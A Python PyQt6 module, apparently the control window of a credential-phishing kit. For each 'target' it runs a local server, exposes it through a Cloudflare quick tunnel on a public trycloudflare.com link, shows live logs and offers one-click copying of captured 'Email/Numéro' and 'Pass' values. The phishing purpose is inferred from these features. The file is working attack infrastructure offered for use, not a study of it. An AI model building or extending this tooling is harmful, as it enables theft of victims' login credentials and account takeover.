"""active_target.py — auto-generated from Release.py."""

import sys
import os
import re
import time
import threading
import subprocess
import socket
import requests
from werkzeug.serving import make_server
from datetime import datetime
from PyQt6.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLineEdit, QPushButton, QLabel, QTextEdit, QGroupBox, QSplitter, QRadioButton, QCheckBox, QFrame, QScrollArea, QDialog, QGridLayout, QTabWidget, QFileDialog, QComboBox, QMenu, QInputDialog, QStyle, QStyleOptionButton, QMessageBox, QListWidget, QListWidgetItem, QAbstractItemView
from PyQt6.QtCore import Qt, QTimer, QPropertyAnimation, QEasingCurve, QVariantAnimation, QAbstractAnimation
from PyQt6.QtGui import QTextCursor, QFont, QColor, QCursor, QPainter
import json
import base64
from routes import app
from config import active_servers, sandbox_config, get_cfg, TARGETS_DIR, BASE_CONFIG, TRASH_DIR, is_target_hidden, set_target_hidden, rename_target_meta, remove_target_meta
from widgets import BounceButton, TextEditorDialog, PublicationDialog, ModernToggleSwitch
from helpers import is_port_in_use, ajouter_log, BANNER_ASCII, log_error

from ._header import BANNER_ASCII, BounceButton, QApplication, QEasingCurve, QHBoxLayout, QLabel, QPropertyAnimation, QTextCursor, QTextEdit, QTimer, QVBoxLayout, QWidget, active_servers, ajouter_log, button_manager, log_error, log_error_to_file, os, subprocess, threading, time

class ActiveTargetWindow(QWidget):
    def __init__(self, main_win, target_name, port, config_data):
        super().__init__()
        self.main_win = main_win
        self.target_name = target_name
        self.port = port
        self.config_data = config_data
        
        self.setWindowTitle(f"Cible : {target_name} (Port: {port})")
        self.setMinimumSize(600, 500)
        self._apply_theme_style()

        layout = QVBoxLayout(self)
        
        # Top actions
        top_lay = QHBoxLayout()
        self.lbl_status = QLabel(f"Statut: En ligne (Port {port})")
        from theme import get_theme as _gt
        _t = _gt()
        self.lbl_status.setStyleSheet(f"color: {_t['success']}; font-weight: bold;")
        top_lay.addWidget(self.lbl_status)
        
        self.btn_pub = BounceButton("🌐 GO PUBLIC")
        self.btn_pub.clicked.connect(self.toggle_public)
        top_lay.addWidget(self.btn_pub)
        
        self.btn_copy = BounceButton("📋 Copy URL")
        self.btn_copy.clicked.connect(self.copy_url)
        from theme import btn_style_neutral as _bsn
        self.btn_copy.setStyleSheet(_bsn())
        top_lay.addWidget(self.btn_copy)
        
        self.btn_stop = BounceButton("■ STOP")
        self.btn_stop.clicked.connect(self.stop_target)
        from theme import btn_style_danger as _bsd
        self.btn_stop.setStyleSheet(_bsd())
        top_lay.addWidget(self.btn_stop)
        
        layout.addLayout(top_lay)
        
        # Logs
        layout.addWidget(QLabel("<b>Logs en temps réel :</b>"))
        self.log = QTextEdit()
        self.log.setReadOnly(True)
        self.log.setHtml(BANNER_ASCII)
        layout.addWidget(self.log)
        
        # Actions bas
        bot_lay = QHBoxLayout()
        btn_clear = BounceButton("Clear Logs")
        btn_clear.clicked.connect(self.clear_logs)
        from theme import btn_style_danger as _bsd2
        btn_clear.setStyleSheet(_bsd2())
        bot_lay.addWidget(btn_clear)
        
        for lbl, key in [("Email/Numéro", "email"), ("Pass", "pass")]:
            b = BounceButton(lbl)
            b.clicked.connect(lambda checked, k=key: self.copy_cred(k))
            bot_lay.addWidget(b)
            
        layout.addLayout(bot_lay)
        
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.maj_logs)
        self.timer.start(1000)
        self.last_logs_len = 0

    def center(self):
        qr = self.frameGeometry()
        cp = self.screen().availableGeometry().center()
        qr.moveCenter(cp)
        self.move(qr.topLeft())

    def showEvent(self, event):
        self.center()
        self.animation = QPropertyAnimation(self, b"windowOpacity")
        self.animation.setDuration(400)
        self.animation.setStartValue(0.0)
        self.animation.setEndValue(1.0)
        self.animation.setEasingCurve(QEasingCurve.Type.InOutQuad)
        self.animation.start()
        super().showEvent(event)

    def maj_logs(self):
        if self.config_data.get("memory_logs") and self.last_logs_len != len(self.config_data["memory_logs"]):
            self.log.setHtml(self.config_data["memory_logs"])
            self.log.moveCursor(QTextCursor.MoveOperation.End)
            self.last_logs_len = len(self.config_data["memory_logs"])

    def _apply_theme_style(self):
        """Build and apply the window stylesheet using the current theme colors."""
        try:
            from theme import get_theme
            t = get_theme()
            self.setStyleSheet(f"""
                QWidget {{ background-color: {t['bg']}; color: {t['text']}; font-size: 13px; }}
                QPushButton {{ background-color: {t['accent']}; color: white; border: none; font-weight: normal; border-radius: 6px; padding: 10px; }}
                QPushButton:hover {{ background-color: {t['accent_hover']}; }}
                QTextEdit {{ background-color: {t['bg_input']}; border: 1px solid {t['border']}; border-radius: 8px; color: {t['text_dim']}; font-family: 'Consolas', monospace; }}
            """)
        except Exception as e:
            try:
                from helpers import log_error
                log_error("ActiveTargetWindow._apply_theme_style", e)
            except Exception:
                pass

    def toggle_public(self):
        button_id = f"toggle_pub_sandbox_{self.config_data.get('target_name', 'unknown')}"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return
        
        button_manager.lock_button(button_id)
        try:
            if not self.config_data.get("public_mode"):
                self.config_data["public_mode"] = True
                self.config_data["cf_url"] = "Connecting..."
                self.btn_pub.setText("PUBLIC ACTIVE")
                self.btn_pub.setEnabled(False)
                threading.Thread(target=self.demarrer_cloudflare, daemon=True).start()
        except Exception as e:
            log_error_to_file("SandboxWindow.toggle_public", e)
            log_error("SandboxWindow.toggle_public", e)
        finally:
            button_manager.unlock_button(button_id)

    def demarrer_cloudflare(self):
        while self.config_data.get("public_mode", False):
            try:
                import shutil
                basename = "cloudflared.exe" if os.name == 'nt' else "cloudflared"
                # 1) System PATH
                cf_path = shutil.which("cloudflared") or basename
                # 2) Search known directories
                if cf_path == basename:
                    candidates = []
                    if getattr(sys, 'frozen', False):
                        candidates.append(os.path.dirname(os.path.abspath(sys.executable)))
                    else:
                        candidates.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
                        candidates.append(os.path.dirname(os.path.abspath(sys.argv[0])))
                    candidates.append(os.getcwd())
                    for d in candidates:
                        p = os.path.join(d, basename)
                        if os.path.exists(p):
                            cf_path = p
                            break

                cmd = [cf_path, "tunnel", "--url", f"http://127.0.0.1:{self.port}"]

                self.config_data["cloudflare_proc"] = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
                # Regex: only the canonical public URL form  https://xxx.trycloudflare.com  (no path, no query, no dest=)
                _TRYCLOUDFLARE_RE = re.compile(r'^https?://[a-z0-9-]+\.trycloudflare\.com/?$', re.IGNORECASE)
                for line in self.config_data["cloudflare_proc"].stdout:
                    if "trycloudflare.com" in line:
                        for p in line.split():
                            # Ignore tokens like dest=https://...trycloudflare.com/video/...
                            # and any URL that has a path after the domain.
                            if p.startswith("dest="):
                                continue
                            if "trycloudflare.com" in p and _TRYCLOUDFLARE_RE.match(p):
                                self.config_data["cf_url"] = p.strip().rstrip('/')
                                from helpers import ajouter_log
                                ajouter_log("TUNNEL", f"Public Link: {self.config_data['cf_url']}", "#f38020", force_cfg=self.config_data)
                                break
                
                self.config_data["cloudflare_proc"].wait()
                if self.config_data.get("public_mode", False):
                    from helpers import ajouter_log
                    ajouter_log("TUNNEL", "Cloudflare reconnecting...", "#ef4444", force_cfg=self.config_data)
                    time.sleep(2)
            except Exception as e:
                log_error_to_file("ActiveTargetWindow.demarrer_cloudflare", e)
                if self.config_data.get("public_mode", False):
                    from helpers import ajouter_log
                    ajouter_log("TUNNEL", f"Cloudflare Error: {e}", "#ef4444", force_cfg=self.config_data)
                    time.sleep(2)

    def stop_target(self):
        button_id = f"stop_active_{self.port}"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return
        
        button_manager.lock_button(button_id)
        try:
            self.config_data["running"] = False
            self.config_data["public_mode"] = False
            if self.config_data.get("server_instance"):
                try: 
                    import threading
                    threading.Thread(target=self.config_data["server_instance"].shutdown, daemon=True).start()
                except Exception as e: 
                    log_error_to_file("ActiveTargetWindow.stop_server", e)
                    log_error("ActiveTargetWindow.stop_server", e)
            if self.config_data.get("cloudflare_proc"):
                try:
                    self.config_data["cloudflare_proc"].terminate()
                    self.config_data["cloudflare_proc"].wait(timeout=3)
                except Exception as e:
                    log_error_to_file("ActiveTargetWindow.stop_cloudflare_terminate", e)
                    log_error("ActiveTargetWindow.stop_cloudflare_terminate", e)
                    try: 
                        self.config_data["cloudflare_proc"].kill()
                    except Exception as e2: 
                        log_error_to_file("ActiveTargetWindow.stop_cloudflare_kill", e2)
                        log_error("ActiveTargetWindow.stop_cloudflare_kill", e2)
                self.config_data["cloudflare_proc"] = None

            from config import active_servers
            if self.port in active_servers:
                del active_servers[self.port]

            self.close()
        except Exception as e:
            log_error_to_file("ActiveTargetWindow.stop_target", e)
            log_error("ActiveTargetWindow.stop_target", e)
        finally:
            button_manager.unlock_button(button_id)

    def closeEvent(self, event):
        self.stop_target()
        event.accept()

    def copy_url(self):
        button_id = "copy_url"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return
        
        button_manager.lock_button(button_id)
        try:
            if self.config_data.get("cf_url") and "http" in self.config_data["cf_url"]:
                QApplication.clipboard().setText(self.config_data["cf_url"])
        except Exception as e:
            log_error_to_file("ActiveTargetWindow.copy_url", e)
            log_error("ActiveTargetWindow.copy_url", e)
        finally:
            button_manager.unlock_button(button_id)
            
    def copy_cred(self, key):
        button_id = f"copy_cred_{key}"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return
        
        button_manager.lock_button(button_id)
        try:
            val = self.config_data.get("last_creds", {}).get(key)
            if val: 
                QApplication.clipboard().setText(str(val))
        except Exception as e:
            log_error_to_file("ActiveTargetWindow.copy_cred", e)
            log_error("ActiveTargetWindow.copy_cred", e)
        finally:
            button_manager.unlock_button(button_id)
        
    def clear_logs(self):
        button_id = "clear_logs_active"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return
        
        button_manager.lock_button(button_id)
        try:
            from helpers import BANNER_ASCII
            self.config_data["memory_logs"] = BANNER_ASCII + "\n"
            self.log.setHtml(self.config_data["memory_logs"])
            self.last_logs_len = len(self.config_data["memory_logs"])
        except Exception as e:
            log_error_to_file("ActiveTargetWindow.clear_logs", e)
            log_error("ActiveTargetWindow.clear_logs", e)
        finally:
            button_manager.unlock_button(button_id)
